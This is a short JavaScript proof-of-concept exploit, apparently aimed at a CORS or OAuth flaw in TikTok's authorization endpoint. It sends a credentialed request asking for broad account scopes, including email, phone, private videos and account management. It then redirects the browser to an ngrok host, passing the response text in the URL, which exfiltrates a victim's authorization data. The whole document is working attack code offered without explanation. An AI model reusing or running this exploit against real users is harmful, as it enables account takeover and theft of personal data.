var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("GET", "https://www.tiktok.com/auth/authorize?client_key=aw8cb3204x0a1g88&response_type=code&scope=bizpartner.user.info%2Cbizpartner.item.info%2Cbiz.account.info%2Cbiz.account.phone%2Cbiz.account.email%2Cuser.info.basic%2Cuser.info.email%2Cuser.info.phone%2Cuser.info.showcase%2Cvideo.list.no_watermark%2Cvideo.list.private_ads.no_watermark%2Cuser.account.configure%2Cvideo.list.manage%2Clive.list%2Ccomment.list%2Ccomment.list.manage&optional_scope=&version=1&lang=en&state=4c3dc9b7f3e3cb80aff6aeec47740e5231ff1630&redirect_uri=https%3A%2F%2Fads.tiktok.com%2Fi18n%2Ftransit%3F_extra%3DcGxhdGZvcm09dGlrdG9rJmxvZ2luX2FjdGlvbj1iaW5kJmZyb21fcGFnZT0mc2hvd19iaW5kX2Vycm9yPXRydWUmc2hvd19sb2dvdXQ9dHJ1ZSZhYWR2aWQ9JnZlcmlmeV90aWNrZXQ9VlRJU0dPMlRTNjJNM1NQOFQ2RVMyWVRWUzRZRlJKSEE0TTdOMksmdmVyaWZ5X3BhZ2U9dXNlci1zZXR0aW5n%26state%3D4c3dc9b7f3e3cb80aff6aeec47740e5231ff1630&error_uri=https%3A%2F%2Fads.tiktok.com%2Fi18n%2Ftransit%3F_extra%3DcGxhdGZvcm09dGlrdG9rJmxvZ2luX2FjdGlvbj1iaW5kJmZyb21fcGFnZT0mc2hvd19iaW5kX2Vycm9yPXRydWUmc2hvd19sb2dvdXQ9dHJ1ZSZhYWR2aWQ9JnZlcmlmeV90aWNrZXQ9VlRJU0dPMlRTNjJNM1NQOFQ2RVMyWVRWUzRZRlJKSEE0TTdOMksmdmVyaWZ5X3BhZ2U9dXNlci1zZXR0aW5n%26state%3D4c3dc9b7f3e3cb80aff6aeec47740e5231ff1630");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "text/javascript");
xhr.send();

function reqListener() {
    location='//e5cc-202-162-37-174.ngrok-free.app/log?key='+this.responseText; 
};
